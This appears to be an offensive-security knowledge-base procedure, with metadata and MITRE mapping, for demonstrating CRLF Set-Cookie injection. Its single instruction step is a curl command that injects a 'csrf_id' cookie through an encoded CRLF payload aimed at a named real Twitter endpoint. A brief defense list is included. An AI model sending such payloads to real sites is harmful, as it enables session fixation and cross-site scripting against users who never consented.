---
tags:
  - cookie-injection
  - crlf-injection
type: procedure
tools:
  - '[[tools/Browser]]'
  - '[[tools/Bandicam]]'
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/curl-header-injection-test]]'
  - '[[commands/curl-set-cookie-injection]]'
  - '[[commands/curl-variation-test]]'
platforms:
  - Web
techniques:
  - '[[JavaScript]]'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
id: 9bafae87-53d0-4efe-819e-a5e8d7a59a26
created_at: '2025-12-11T06:10:16.080Z'
updated_at: '2025-12-11T06:10:16.080Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[TA0002]]'
mitre_techniques:
  - '[[T1059.007]]'
---
# Demonstrate Set-Cookie Injection

## Summary

This procedure demonstrates injecting a Set-Cookie header via CRLF to set arbitrary cookies, which could enable XSS or session fixation.

## Description

Building on header injection, this targets cookie setting for potential client-side attacks. It works on modern browsers and requires inspecting cookie storage post-request.

## Requirements

1. Browser with dev tools
2. Vulnerable endpoint
3. URL encoding knowledge

## Defense

Defensive measures and detection strategies:

- Strip CRLF from inputs
- Set secure cookie flags and monitor for anomalous cookies

## Objectives

1. Inject Set-Cookie header
2. Verify cookie is set
3. Assess escalation potential

## Instructions

### Step 1: Inject Set-Cookie

**Context**: Send request to inject cookie.

**Command** ([[commands/curl-set-cookie-injection]]):

```bash
curl -i 'https://ads.twitter.com/subscriptions/mobile/landing?t=%0d%0aSet-Cookie:%20csrf_id=injection%3b'
```

> Check if the response sets the 'csrf_id' cookie.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques



## Commands Used

- [[commands/curl-set-cookie-injection]]

## Tools Used

- [[tools/Browser]]

## Tags

- [[commands/curl-set-cookie-injection]]
- [[commands/curl-header-injection-test]]
